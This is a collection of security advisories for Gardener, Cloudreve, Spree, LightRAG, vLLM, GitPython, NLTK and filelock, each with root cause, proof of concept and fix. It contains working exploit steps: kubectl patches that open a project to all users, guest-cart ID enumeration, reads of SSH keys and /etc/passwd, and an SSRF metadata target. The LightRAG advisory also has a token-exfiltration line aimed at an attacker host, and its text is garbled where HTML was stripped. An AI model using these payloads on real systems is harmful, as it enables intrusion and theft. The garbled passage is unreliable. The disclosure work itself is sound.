cves.summary: ## Overview The `manage-members` custom verb authorization check in the Gardener API server's `customverbauthorizer` admission plugin can be bypassed by adding `Group` or `ServiceAccount` subjects to a Project's member list. The check is documented as controlling "human users or groups", but the implementation only gates changes to `User`-kind subjects. A project admin (without `manage-members` permission) can add arbitrary Group subjects - including `system:authenticated` - granting all authenticated users full project-level access. ## Technical Details The official Gardener documentation at `docs/usage/project/projects.md:90-92` explicitly states: However, the `mustCheckProjectMembers()` function at `admission.go` compares old and new member lists using `findHumanUsersWithRoles()`, which only tracks subjects where `isHumanUser()` returns true: ```go func mustCheckProjectMembers(oldMembers, members []core.ProjectMember, owner *rbacv1.Subject, userInfo user.Info) bool { if apiequality.Semantic.DeepEqual(oldMembers, members) { return false } if userIsOwner(userInfo, owner) { return false } var oldHumanUsers, newHumanUsers = findHumanUsersWithRoles(oldMembers), findHumanUsersWithRoles(members) // ... return !oldHumanUsers.Equal(newHumanUsers) } ``` The `isHumanUser()` function at `admission.go` only matches `Kind == "User"`: ```go func isHumanUser(subject rbacv1.Subject) bool { return subject.Kind == rbacv1.UserKind && !strings.HasPrefix(subject.Name, serviceaccount.ServiceAccountUsernamePrefix) } ``` Kind: "Group" subjects are NOT matched by `isHumanUser()`, making Group member changes invisible to the authorization check. A project admin without manage-members permission can freely add or remove Group members. ## Steps to reproduce _Proof of concept:_ 1. Verify current project membership and confirm the owner has `manage-members` permission: ```bash # Project members before the test: $ kubectl get project local -o yaml # members: # - apiGroup: rbac.authorization.k8s.io # kind: User # name: admin-user # role: admin # roles: # - owner # Confirm the owner CAN manage-members (expected) $ kubectl auth can-i manage-members projects.core.gardener.cloud/local --as=admin-user yes ``` 2. Add a second admin user (`test-admin-user`) to the project WITHOUT the `uam` role, then confirm they lack `manage-members`: ```bash # After adding test-admin-user as admin (no uam role): $ kubectl get project local -o yaml # members: # - apiGroup: rbac.authorization.k8s.io # kind: User # name: admin-user # role: admin # roles: # - owner # - apiGroup: rbac.authorization.k8s.io # kind: User # name: test-admin-user # role: admin # Confirm test-admin-user does NOT have manage-members $ kubectl auth can-i manage-members projects.core.gardener.cloud/local --as=test-admin-user no ``` 3. Verify `test-admin-user` cannot add a human User member (the check works for Users): ```bash $ kubectl patch --as=test-admin-user project local --type=merge -p '{ "spec": { "members": [ { "kind": "User", "apiGroup": "rbac.authorization.k8s.io", "name": "new-human-user@example.com", "role": "viewer" } ] } }' Error from server (Forbidden): [projects.core.gardener.cloud](https://projects.core.gardener.cloud/) "local" is forbidden: user "test-admin-user" is not allowed to manage human users or groups in .spec.members for "projects" ``` 4. Bypass the check by adding a Group subject instead: ```bash # This should be denied but ISN'T - the manage-members check is bypassed $ kubectl patch project local --as=test-admin-user --type=json -p '[ { "op": "add", "path": "/spec/members/-", "value": { "kind": "Group", "apiGroup": "rbac.authorization.k8s.io", "name": "system:authenticated", "role": "admin", "roles": ["admin"] } } ]' project.core.gardener.cloud/local patched ``` 5. Verify the Group was added to project members: ```bash $ kubectl get project local -o yaml # members: # - apiGroup: rbac.authorization.k8s.io # kind: User # name: admin-user # role: admin # roles: # - owner # - apiGroup: rbac.authorization.k8s.io # kind: User # name: test-admin-user # role: admin # - apiGroup: rbac.authorization.k8s.io # kind: Group # name: system:authenticated # role: admin ``` 6. Demonstrate the impact - any authenticated user now has project access: ```bash # As a random user $ kubectl --as=random-user@example.com get shoots -n garden-local NAME CLOUDPROFILE PROVIDER REGION K8S VERSION HIBERNATION LAST OPERATION STATUS AGE local local local local 1.35.0 Awake Create Succeeded (100%) healthy 30m ``` >_Note: `random-user@example.com` does not exist as a real user. However, the Kubernetes `--as` global flag performs user impersonation which is treated as a successfully authenticated request, automatically adding the `system:authenticated` group. Since `system:authenticated` was added as a project admin member, this non-existent user now has full admin access to the project including all Shoots, Secrets, and cloud provider credentials._ ## Security Impact - Unauthorized access expansion: A project admin can grant project-level access to ANY Kubernetes group, including `system:authenticated` (all authenticated users) or `system:unauthenticated` (all unauthenticated users). ## Patching & Remediation 1. **Fix `isHumanUser()` to include Groups**: The function should match the documented behavior. Change: ```go func isHumanUser(subject rbacv1.Subject) bool { return subject.Kind == rbacv1.UserKind && !strings.HasPrefix(subject.Name, serviceaccount.ServiceAccountUsernamePrefix) } ``` To: ```go func isNonServiceAccountSubject(subject rbacv1.Subject) bool { if subject.Kind == rbacv1.GroupKind { return true } return subject.Kind == rbacv1.UserKind && !strings.HasPrefix(subject.Name, serviceaccount.ServiceAccountUsernamePrefix) } ```

cves.summary:
### Summary
There is a privilege scope bypass in Cloudreve's admin API where two endpoints that mutate server state are missing the write-scope enforcement that their neighboring endpoints correctly apply. Specifically, the WOPI configuration fetch endpoint and the SMTP test/mail endpoint can both be triggered by an OAuth token that only has Admin.Read authorization — no Admin.Write needed. This breaks the intended OAuth scope boundary in a way that's subtle enough to have slipped through but meaningful enough to matter in a real deployment.

### Details
The root cause is an inconsistency in how the admin tool routes are wired up in `routers/router.go`. The admin route group sets a baseline of `ScopeAdminRead` for everything underneath it (around line 868), and most write-capable endpoints inside the `tool` sub-group correctly layer on an additional `RequiredScopes(types.ScopeAdminWrite)` check on top of that. For example, the thumbnail executable setter (line 929) and the entity URL cache deletion (line 937) both do this properly.

The two endpoints that don't follow this pattern are `tool.GET('wopi')` (line 925) and `tool.POST('mail')` (line 933). Despite `POST /mail` clearly triggering an outbound email and `GET /wopi` fetching or probing WOPI service connectivity, neither has the `ScopeAdminWrite` guard. What that means in practice is that any OAuth application granted only Admin.Read — a scope that should be limited to inspecting configuration, not changing anything — can silently invoke both of these operations. The developer looking at the route definitions would reasonably assume all the write-adjacent tool endpoints were protected, because the ones right above and below them are. It's the kind of gap that's easy to miss in a code review.

### PoC
```bash
# OAuth app with ONLY Admin.Read scope can send emails:
curl -s -X POST -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <ADMIN_READ_ONLY_TOKEN>' \
  'https://cloudreve.example.com/api/v4/admin/tool/mail' \
  -d '{"settings":{"smtpHost":"smtp.gmail.com","smtpPort":"587",...},"to":"victim@example.com"}'
# Expected: 403 Forbidden (if Admin.Write was required)
# Actual: 200 OK, email is sent
```

### Impact
An OAuth application or API key scoped to Admin.Read can send arbitrary emails through the server's configured SMTP account and probe internal WOPI service endpoints — both actions that should require elevated write authorization. In multi-party deployments where Admin.Read tokens are issued more liberally (e.g., to monitoring integrations or third-party plugins), a compromised or malicious token holder gains capabilities well beyond what the scope contract implies. Scope separation in OAuth 2.0 is a security boundary, not just a convention, and its violation here could factor into broader attack chains.

### Fix
Add `middleware.RequiredScopes(types.ScopeAdminWrite)` as the first handler argument to both the `tool.GET('wopi')` and `tool.POST('mail')` route definitions in `routers/router.go`. This brings them in line with `tool.POST('thumbExecutable')` at line 929 and `tool.DELETE('entityUrlCache')` at line 937, which already follow the correct pattern. No logic changes are needed — it's purely an additive middleware insertion.

**If possible, please apply for a CVE number when publishing. I would greatly appreciate it.**

cves.summary:
## Summary

The Store API v3 endpoint `PATCH /api/v3/store/carts/:id/associate` binds a guest cart to the authenticated caller without verifying possession of that cart. It locates the cart by prefixed ID only — `current_store.carts.where(user: [nil, current_user]).find_by_prefix_id!(params[:id])` — and omits the `authorize!(:update, @cart, cart_token)` check that every other action in the controller performs via `CartResolvable`. Because prefixed IDs are a reversible Sqids encoding of the auto-increment primary key (obfuscation, not a token), an authenticated customer can name arbitrary guest cart IDs, take them over, and read the checkout addresses stored on them. This is broken access control / IDOR, reachable by any low-privilege registered user.

## Severity

Requires an authenticated store account and depends on target guest carts already carrying an address and not yet being associated, on a store not running in `login_required` mode. Confidentiality impact is the driver (guest checkout PII); integrity impact is limited and recoverable (cart reassignment + email overwrite on an in-progress cart). Not Critical: the action is gated behind authentication (`PR:L`, not `PR:N`) and constrained by cart state, so it is not anonymously exploitable.

## Details

**Root cause:** `associate` skips the cart-possession check its sibling actions enforce and trusts a guessable identifier as the sole locator.

**Entry point.** `Spree::Api::V3::Store::CartsController#associate` (`carts_controller.rb:88-96`), guarded only by `prepend_before_action :require_authentication!, only: [:index, :associate]`. That requires the *caller* be authenticated; it does not tie the request to a specific guest cart.

```ruby
# spree/api/app/controllers/spree/api/v3/store/carts_controller.rb:88-96
# PATCH /api/v3/store/carts/:id/associate
def associate
  @cart = find_cart_for_association

  result = Spree.cart_associate_service.call(guest_order: @cart, user: current_user, guest_only: true)

  if result.success?
    render_cart
  else
    render_service_error(result.error.to_s)
  end
end
```

**Missing check.** `find_cart_for_association` (`carts_controller.rb:177-178`) resolves any guest cart (`user IS NULL`) in the store by ID with no `authorize!(..., cart_token)`. Contrast `CartResolvable#find_cart!`, which binds the token.

```ruby
# spree/api/app/controllers/spree/api/v3/store/carts_controller.rb:177-178
def find_cart_for_association
  current_store.carts.where(user: [nil, current_user]).find_by_prefix_id!(params[:id])
end
```

**Identifier.** `prefixed_id` is `"cart_" + SQIDS.encode([id])` with `SQIDS = Sqids.new(min_length: 10)` (`prefixed_id.rb:17,56`) — default alphabet, no salt, no blocklist. Sqids is non-cryptographic and reversible, so candidate IDs are derivable offline from sequential primary keys.

```ruby
# spree/core/app/models/concerns/spree/prefixed_id.rb:17-56
SQIDS = Sqids.new(min_length: 10)

def prefixed_id
  return nil unless id.present?

  "#{self.class._prefix_id_prefix}_#{Spree::PrefixedId::SQIDS.encode([id])}"
end
```

**Data flow.** `Spree.cart_associate_service.call(guest_order: @cart, user: current_user, guest_only: true)` reassigns the owner and overwrites email, preserving existing addresses via `bill_address ||= / ship_address ||=`. `render_cart` then serializes `billing_address`/`shipping_address` (first_name, last_name, address1, address2, city, postal_code, phone, company) back to the caller.

## PoC

**Preconditions:** attacker holds an ordinary store account (self-service registration) and the store's publishable key (a front-end credential, present in any headless storefront bundle); one or more guest carts carry checkout addresses; store is not in `login_required` mode.

1. Authenticate: `POST /api/v3/store/auth/login` → attacker JWT.
2. Derive candidate IDs offline: `"cart_" + Sqids.encode([n])` for a range of `n`.
3. For each candidate: `PATCH /api/v3/store/carts/<id>/associate` with the attacker JWT. A hit returns `200` with the victim's `billing_address`/`shipping_address`; non-guest or missing carts return `404`/`422`.

## Impact

**Confidentiality:** an authenticated attacker can enumerate guest cart IDs and read checkout PII (name, street, postal code, phone) on carts they don't own. **Integrity:** limited and recoverable — each call reassigns the guest cart and overwrites its email, disrupting the original guest's in-progress cart. Requires a registered account, so not anonymously exploitable.

## Remediation

Update to Spree 5.4.4 or 5.5.4. Your storefront, based on https://github.com/spree/storefront, doesn't need any updates because it has always sent a cart token when associating carts; this is a backend issue.

cves.summary: ### Summary The LightRAG WebUI renders assistant/answer chat content as **raw HTML** — `react-markdown` is configured with `rehypePlugins={[rehypeRaw]}` and `skipHtml={false}` and **no** HTML sanitizer (`rehype-sanitize`), element allow-list, or custom `urlTransform`. Because answer content is derived from user-ingested documents, an attacker who can add a single document can store an HTML/JavaScript payload that executes in the browser of any user who later retrieves it (typically an administrator), leading to auth-token theft from `localStorage` and full API takeover. No authentication is required in the default configuration. ### Details Sink — `lightrag_webui/src/components/retrieval/ChatMessage.tsx`: - Main answer (`MessageMarkdown`, lines ~348-351) and thinking content (lines ~252-272) render with `rehypePlugins={[rehypeRaw, …]}` and `skipHtml={false}`. The `components` map (lines ~111-156) only restyles safe formatting tags (`p`, `h1`–`h4`, `ul`, `ol`, `li`, `code`); there is no `rehype-sanitize`, no `allowedElements`/`disallowedElements`, and no custom `urlTransform`. - Second sink: mermaid is initialized with `securityLevel: 'loose'` (line ~433) and the rendered SVG is injected via `container.innerHTML = svg` (line ~483) + `bindFunctions(container)`. `'loose'` disables mermaid's output sanitization, so a ` ```mermaid ` block in answer content (HTML label / `click` directive) is an additional script-execution path. - Hardening (not code execution): KaTeX is set with `trust: true` (lines ~261/~359). `\href{javascript:…}` is blocked by React 19, but `\includegraphics{URL}` renders a live remote `` (arbitrary external resource load from the victim's browser). Recommend `trust: false`. Source → sink: `POST /documents/text` or `POST /documents/upload` stores the document → `POST /query` returns it (verbatim when `only_need_context=true`, `lightrag/api/routers/query_routes.py:27`; otherwise echoed by the LLM) → the response is streamed into `assistantMessage.content` (`lightrag_webui/src/features/RetrievalView.tsx:340`) → rendered by the sink above. react-markdown's built-in defenses do NOT cover this: it sanitizes `href`/`src` URLs (so `javascript:` links are blocked) and React ignores string event handlers (so `` is dropped), but raw elements such as ``; // EXACT options from ChatMessage.tsx (rehypeRaw + skipHtml:false, no sanitizer): const body = renderToStaticMarkup( React.createElement(ReactMarkdown, { rehypePlugins: [rehypeRaw], skipHtml: false }, answer) ); writeFileSync('poc.html', `before-xss${body}`); console.log(body); // note the LIVE ","file_source":"note.md"}' ``` Then query the knowledge base from the WebUI (or `POST /query` with `only_need_context=true`); the stored payload renders and the benign marker script runs in the viewer's browser (the page title becomes the origin). A real attacker replaces the benign marker with `fetch('//attacker/?t='+localStorage.getItem('LIGHTRAG-API-TOKEN'))` to exfiltrate the victim's JWT (verified storage key) and impersonate them against the API. ### Impact Stored (persistent) cross-site scripting. Any user in the default no-auth deployment, or any authenticated low-privilege collaborator when auth is enabled, can plant a document whose content runs arbitrary JavaScript in the browser of every user who later retrieves it. Because LightRAG keeps the auth token in `localStorage`, the injected script can read it and drive the API as the victim (exfiltrate/modify/delete the knowledge base and graph, upload documents) — i.e. escalate to full account/instance takeover.

cves.summary:
### Summary

`vllm/transformers_utils/processors/mimo_v2_omni.py` — the multimodal processor for `MiMoV2OmniForCausalLM` — issues `requests.get(...)` directly on user-supplied image and audio URL strings and `Image.open(...)` on user-supplied local paths, **without** the SSRF / `allowed_local_media_path` checks that `vllm.multimodal.utils.MediaConnector` was hardened with in **GHSA-qh4c-xf7m-gxfc**, **GHSA-v359-jj2v-j536**, and **GHSA-pf3h-qjgv-vcpr**.

This is the same bug class as those three published advisories, in a code path the patches missed. When a user passes a URL or local-file string through `multi_modal_data` (e.g. `LLM.generate(multi_modal_data={"image": "http://..."})`), the processor takes the unsanitized string and dispatches it without any URL-scheme allowlist, network-target allowlist, size cap, or local-path allowlist.

### Details

**File:** `vllm/transformers_utils/processors/mimo_v2_omni.py` (current `main`)

**Sink 1 — image SSRF + local-file read (`_fetch_image`, lines 231–249):**

```python
def _fetch_image(src: Any) -> Image.Image:
    if isinstance(src, Image.Image):
        return _to_rgb(src)
    if isinstance(src, bytes):
        return _to_rgb(copy.deepcopy(Image.open(BytesIO(src))))
    if isinstance(src, str):
        if src.startswith(("http://", "https://")):
            r = requests.get(src, timeout=30)              # SSRF: no allowlist, follows redirects
            r.raise_for_status()
            return _to_rgb(copy.deepcopy(Image.open(BytesIO(r.content))))
        if src.startswith("file://"):
            return _to_rgb(Image.open(src[7:]))            # arbitrary local file read
        if src.startswith("data:image"):
            ...
        return _to_rgb(Image.open(src))                    # fallback also opens local files
    raise ValueError(f"Unrecognized image source: {type(src)}")
```

**Sink 2 — audio SSRF (around line 471):**

```python
elif audio.startswith(("http://", "https://")):
    r = requests.get(audio, timeout=30)                    # SSRF: same pattern
    r.raise_for_status()
    file_obj = io.BytesIO(r.content)
```

**Reachability.** `_fetch_image` is invoked from `MiMoVLProcessor.process_image`:

```python
def process_image(self, image: ImageInput) -> torch.Tensor:
    kw = self._resolve_img_kw(image)
    src = image.image
    if isinstance(src, (str, bytes)):
        src = _fetch_image(src)
    ...
```

`MiMoVLProcessor` is wrapped by `MiMoV2OmniMultiModalProcessor` and registered for the `MiMoV2OmniForCausalLM` model architecture (`vllm/model_executor/models/mimo_v2_omni.py:1169`). Whenever a user passes a string into `multi_modal_data["image"]` (or `["audio"]`) for this model, the unsanitized URL/path reaches the sink.

**Comparison to the recent fixes.** The remediation pattern adopted in the three earlier advisories was to route every external resource fetch through `MediaConnector`, which checks `allowed_local_media_path` and applies SSRF protection before issuing the network request. `chat_utils.py` (lines 838, 902, 924, 963, 1053, 1081) already uses `self._connector.fetch_image / fetch_audio / fetch_video`. The model processor in `mimo_v2_omni.py` was added later and skipped the connector — it calls `requests.get` and `Image.open` directly. Result: the public OpenAI chat-completion path is protected, but library use (`LLM.generate(multi_modal_data=...)`), batch processing, and any other path that lets a string reach the processor receive no protection.

### Impact

1. **SSRF — internal-network probing / cloud-metadata theft.** Standard `requests.get` follows redirects and accepts any URL. An attacker who controls a `multi_modal_data` value can:
   - read AWS / GCP / Azure instance metadata (e.g. `http://169.254.169.254/latest/meta-data/iam/security-credentials/`),
   - probe internal services on the vLLM host (`http://127.0.0.1:<port>`, `http://10.x.y.z`),
   - exfiltrate via DNS / HTTP timing oracles even when the body is rejected by `Image.open`.
2. **Arbitrary local file read** via `file://path` (line 242) and the unguarded fallback `Image.open(src)` (line 248). Any file readable by the vLLM process is reachable through the model pipeline; with suitable formats this exposes `/etc/passwd`, `~/.aws/credentials`, etc.
3. **Server-side traffic generation / amplification** by hammering arbitrary URLs from the vLLM host, with a 30-second timeout per request.

### Suggested remediation

Replace direct `requests.get` and bare `Image.open` paths with `MediaConnector.fetch_image` / `fetch_audio_async` (or pass the inputs through `MediaConnector` before they reach the processor):

```python
# vllm/transformers_utils/processors/mimo_v2_omni.py
from vllm.multimodal.utils import MediaConnector

_connector = MediaConnector()
```

## Summary
`TagReference.create()` forwards a caller-influenced positional `reference` value into `git tag` without it ever being inspected by the unsafe-option guard, allowing an arbitrary file read (the file's contents are returned in-band as the annotated tag message). This is an incomplete-fix bypass of commit `3af0c251` (the fix for GHSA-3f7w-8rr8-f37f's tag instance).

## Root Cause
The fix `3af0c251` added `unsafe_git_tag_options = ["--file","-F"]` and a guard call, but the guard is `Git.check_unsafe_options(options=Git._option_candidates([], kwargs), unsafe_options=...)` at `git/refs/tag.py:139` — it passes an EMPTY args list and inspects **kwargs only**. The dangerous values `path` and `reference` are POSITIONALS (`args = (path, reference)`, tag.py:156), placed before any `--`. A user-influenced `reference="--file=<path>"` therefore reaches `git tag` as the exact `--file` option the fix intended to block, creating an annotated tag whose message is the file's contents.

## Impact
Arbitrary local file read at the privileges of the host process; contents returned in-band via `tagref.tag.message`. Requires the embedding application to forward a caller-influenced `reference` value into `TagReference.create()` (pure VALUE control — the CVE-2026-42215 threat model). Default `allow_unsafe_options=False`.

## Proof of Concept
```python
from git import TagReference
t = TagReference.create(repo, "vpwn", reference="--file=/home/app/.ssh/id_rsa")
print(t.tag.message)   # contents of the file
```

## Attack Chain
1. Entry: app calls `TagReference.create(repo, name, reference=<user>)` with `reference="--file=/home/app/.ssh/id_rsa"`.
2. Check: `Git.check_unsafe_options(_option_candidates([], kwargs), ["--file","-F"])` @ tag.py:137-141. Guard: denylist includes `--file`/`-F`. Bypass proof: `_option_candidates` receives `args=[]` → the positional `reference` is never a candidate (the kwarg spelling `file="…"` IS blocked; only the positional escapes).
3. Sink: `repo.git.tag(*args, **kwargs)` @ tag.py:158 → no `--`. argv (observed): `['git','tag','-f','vpwn','--file=<secret>']`.
4. Impact: annotated tag created; `tagref.tag.message` == file contents (arbitrary file read).

## Bypass Evidence
Independently reproduced (independent test harness, git 2.43.0, default `allow_unsafe_options=False`): `TagReference.create(repo,'vp','--file=<secret>')` → PASSED; `tag.message == 'GATE_SECRET_LINE_A\nGATE_SECRET_LINE_B'`. Control: `TagReference.create(..., file='<secret>')` ��� `UnsafeOptionError: --file is not allowed`. Fix-commit read: `3af0c251` adds `_option_candidates([], kwargs)` (empty args → positional never a candidate).

## Affected Versions
`GitPython <= 3.1.58` (sink present verbatim on the latest release tag; `git diff 3.1.57..HEAD` touches only test files).

## Suggested Fix
Include the positional `reference` (and `path`) in the option-candidate list passed to `check_unsafe_options`, or place a `--` separator before the positional arguments in `TagReference.create()`.

Reported by **zx (Jace)** — GitHub: @manus-use

## Summary
`Repo.blame()` / `Repo.blame_incremental()` guard forwarded revision options against `unsafe_git_revision_options`, but that denylist only contains the file-WRITE options `--output`/`-o`. `git blame` also honors `--contents <file>` and `-S <file>`, which cause the file's lines to be echoed into the blame result — an arbitrary file READ. Neither option is in the denylist, so a caller-influenced revision value of `--contents=<path>` passes the guard and leaks file contents. This is a distinct sink-option and impact class (READ) from GHSA-956x-8gvw-wg5v (which addressed the blame `--output` WRITE), directly analogous to GHSA-539m-9xh6-q6rr (archive READ gap accepted separately from the archive write/exec advisory).

## Root Cause
`unsafe_git_revision_options = ["--output","-o"]` (`git/repo/base.py:188`). The `rev` string is passed to `_option_candidates([rev], kwargs)` and placed BEFORE the `--` separator (base.py:841). The canonical name of `--contents=...` is `contents`, which is not on the denylist, so no `UnsafeOptionError` is raised. The trailing `--` protects only the pathspec, not the option before the revision.

## Impact
Arbitrary local file read at the privileges of the host process; the file's line contents appear in the blame result returned to the caller. Pure VALUE control (the caller forwards a user-influenced revision string). Default `allow_unsafe_options=False`.

## Proof of Concept
```python
result = repo.blame("--contents=/etc/passwd", "a.txt")
# result rows carry the victim file's line text
```

## Attack Chain
1. Entry: app calls `repo.blame(rev, file)` with attacker `rev="--contents=/etc/passwd"` (or kwarg `contents="/etc/passwd"`, or `-S`).
2. Check: `Git.check_unsafe_options(_option_candidates([rev,...], kwargs), unsafe_git_revision_options)` @ base.py:841. Guard: denylist = `["--output","-o"]` only. Bypass proof: canonical name `contents` ∉ denylist → no error.
3. Sink: `self.git.blame(rev, "--", file, p=True, ...)`. argv (observed): `['git','blame','-p','--contents=<secret>','HEAD','--','a.txt']`.
4. Impact: blame result rows carry the victim file's line text.

## Bypass Evidence
Independently reproduced (independent test harness, default `allow_unsafe_options=False`): `blame('--contents=<secret>','a.txt')` → guard PASSED; result rows = `['GATE_SECRET_LINE_A','GATE_SECRET_LINE_B']`. Control: `blame('--output=…')` still BLOCKED (guard active on this path). `-S` kwarg argv also reaches git unguarded.

## Affected Versions
`GitPython <= 3.1.58` (denylist present verbatim on the latest release tag).

## Suggested Fix
Prefer an allowlist of blame options; at minimum add `--contents`/`-S` (and any other path-taking blame options) to `unsafe_git_revision_options`, and make the membership rule "the option takes a filesystem path" rather than "the option writes output".

Reported by **zx (Jace)** — GitHub: @manus-use

### Summary

There's a logic bug in `FileSystemPathPointer.open()` inside `nltk/data.py`
that makes the sandbox check permanently inert. The guard condition is always
`False` — meaning any file the process can read is accessible by passing a
`file://` URL to `nltk.data.load()`.

### Details

In `nltk/data.py`, `FileSystemPathPointer.open()` was patched at some point
with a comment saying "SECURITY PATCH ENFORCING SANDBOX", but the check
doesn't work:
```python
def open(self, encoding=None):
    path = os.path.normpath(self._path)

    # Block raw absolute reads such as "/" "C:\\Windows" etc.
    if os.path.isabs(path) and path != os.path.normpath(self._path):
        raise ValueError(f"Direct absolute file access blocked: {path}")

    stream = open(self._path, "rb")
```

`path` is set to `os.path.normpath(self._path)` on line 1, then compared
against `os.path.normpath(self._path)` again in the condition. They are
always equal. The `ValueError` never fires.

On top of that, `__init__` already calls `os.path.abspath()` before storing
`self._path`, so it's normalized before `open()` is even called. Running
`normpath` on it again changes nothing.

The `stream = open(self._path, "rb")` line is always reached regardless of
what path was passed in.

### PoC

Tested on Python 3.11, NLTK 3.9.1, Ubuntu 22.04.
```python
import nltk
from nltk.data import FileSystemPathPointer

# direct construction
ptr = FileSystemPathPointer("/etc/passwd")
with ptr.open() as f:
    print(f.read(300))

# via load() using file:// URL
data = nltk.data.load("file:///etc/passwd", format="raw")
print(data[:300])
```

Both print file contents. No exception is raised.

### Impact

Any app that lets users influence the string passed to `nltk.data.load()` or
`nltk.data.find()` is exposed — web APIs, notebook servers, multi-tenant
pipelines. An attacker can read any file the process user has access to:
`/etc/passwd`, `.env` files, private keys, `~/.aws/credentials`, etc.

## Suggested Fix

**File:** `nltk/data.py` — `FileSystemPathPointer.open()` (lines 378–390)

### What's wrong

Line 387 compares `normpath(self._path)` against itself — always equal,
so the `ValueError` never fires. The check is dead code.
`__init__` already calls `abspath()` on construction, so re-running
`normpath` inside `open()` changes nothing either.

### Fix

Validate against the actual list of permitted data directories instead:
```python
def open(self, encoding=None):
    import nltk.data as _d
    allowed = [os.path.abspath(p) for p in _d.path if p]
    if allowed and not any(
        os.path.commonpath([self._path, r]) == r for r in allowed
    ):
        raise ValueError(
            f"Access outside nltk_data blocked: {self._path!r}"
        )
    stream = open(self._path, "rb")
    if encoding is not None:
        stream = SeekableUnicodeStreamReader(stream, encoding)
    return stream
```

### Why `commonpath` not `startswith`

`startswith` is bypassable by a path that shares a prefix:
```
/tmp/nltk_data_evil".startswith("/tmp/nltk_data") → True  ✗
commonpath(["/tmp/nltk_data_evil", "/tmp/nltk_data"]) → "/tmp"  ✓
```

### Diff
```diff
-    path = os.path.normpath(self._path)
-    if os.path.isabs(path) and path != os.path.normpath(self._path):
-        raise ValueError(f"Direct absolute file access blocked: {path}")
-
+    import nltk.data as _d
+    allowed = [os.path.abspath(p) for p in _d.path if p]
+    if allowed and not any(
+        os.path.commonpath([self._path, r]) == r for r in allowed
+    ):
+        raise ValueError(f"Access outside nltk_data blocked: {self._path!r}")
     stream = open(self._path, "rb")
```

`ReadWriteLock` and `AsyncReadWriteLock` (the SQLite-backed reader/writer lock) remove their private `.filelock-*` link directories with `shutil.rmtree` (a recursive delete) on a remembered path. They do not check that the path still names the directory they created. This happens on the hard-link route (a hard link is a second name for the same file). That route is every connection on macOS since 4.1.1 and any POSIX process without a usable `/proc/self/fd` (a Linux path that names the process's own open files), such as a chroot or container that does not mount `/proc`.

Another local user who can rename entries in the directory that holds the lock database can rename one of the directories of the user running the lock (below: the lock user) onto the link directory's name, or onto a forged dead-holder name. Such a lock directory is a `0777` or group-writable cache, build or project directory without the sticky bit (a directory flag that lets only a file's owner remove or rename it). The lock user's process then deletes that tree and everything in it with the lock user's permissions, and reports no error. Stock Linux with `/proc` mounted is not affected. Affected versions are filelock 4.1.0 through 4.2.0.

Anthropic's OSS Scanner reported this in private as `ANT-2026-LSSZIUEO` [high, CWE-367]: ReadWriteLock deletes any directory another user renames to .filelock-*.

## Severity

**CVSS 3.1 `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:L` scores 6.1 (Medium).** `AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:L` (low attack complexity): two `rename` calls and no race against filelock's own code. `I:H` (high integrity impact): the other user destroys a directory tree owned by the lock user, and the lock user's program reports no error. `A:L` (partial availability loss): the Python 3.11 `RecursionError` variant makes the lock user's first lock construction fail. `C:N` (no confidentiality impact): the other user learns nothing. `S:U` (scope unchanged): the effect stays within the lock user's own privileges.

Classification from the external review: **conditional security**, a cross-user rename in a non-sticky shared parent that turns private-link cleanup into recursive deletion of the lock user's tree. The scanner rated it high. The review accepts the mechanism, notes that the macOS route rests on a Linux run with `/proc` hidden rather than on a run on macOS, and narrows the finding to that precondition and route.

## Scope and preconditions

- The other party is a different local account with write permission on the directory that holds the lock database, where that directory has no sticky bit. That is a `0777` directory, or a group-writable one (in a setgid `2775` directory a group member can rename the lock user's sub-directory the same way). Renaming an entry needs write permission on the parent only, not on the entry. Anyone who can write the parent can rename a `0700` directory of the lock user.
- Sticky directories (`/tmp` itself, any `1777` directory) stop the release variant: the rename of an entry owned by the lock user fails with `EPERM`. The dead-owner sweep still reaches a lock user's tree that sits inside a directory the other account owns there. That account may rename its own directory to a forged dead-owner name, and the lock user's sweep deletes everything inside it. The Python 3.11 `RecursionError` variant also works in a sticky directory.
- Platform and route. The lock user must connect through the private hard link. That is every `ReadWriteLock` or `AsyncReadWriteLock` on macOS (since 4.1.1, #820), or a POSIX process whose `/proc/self/fd/<n>` (`/dev/fd/<n>` elsewhere) does not exist, such as a chroot or container without `/proc`. Linux with `/proc` mounted connects through the descriptor and creates no `.filelock-*` directory (checked: none appears, also with two holders in one process), so stock Linux is not affected at 4.2.0. The macOS statement rests on the `descriptor_usable` branch at line 984 and `docs/how-to.rst`. The reproducer runs the same Python code on Linux with `/proc` hidden, which takes root and is test scaffolding, not a step the other user performs. Windows does not take this route.
- Target set. Only directories that sit in the shared parent itself, or that the other account can already write, are reachable. The kernel refuses to move a `0700` directory of the lock user in from another parent. A tree the other account can already write (a group-writable project tree created with umask `002`) is no gain, since that account can delete it without filelock. A lock user running as root deletes a tree of any owner.
- Ancestor boundary. Protection against another local user is possible only while no other user can replace the lock's directory or any of its ancestors. That holds when each ancestor belongs to the user or root and is either not writable by others or sticky.

## Affected code

At the scanned commit `b831496b0273`: [`_ForkSafeConnection.close` runs `shutil.rmtree` on the remembered `mkdtemp` path](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L290-L296). The path comes from [`retain_until_close`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L305-L307), set on the [link route in `_connect_through_descriptor`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L984-L1011), where [`descriptor_usable` is `False` on macOS](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L984). Three more `rmtree` sites sit in [`_link_beside`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1014-L1029) (lines 1023 and 1026) and the connect's `finally` (line 1011). The fifth is in [`_sweep_links_of_the_dead`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1032-L1051), with the name parser [`_owner_is_gone`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1054-L1065) and [`_link_prefix`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1068-L1071).

## Introduced

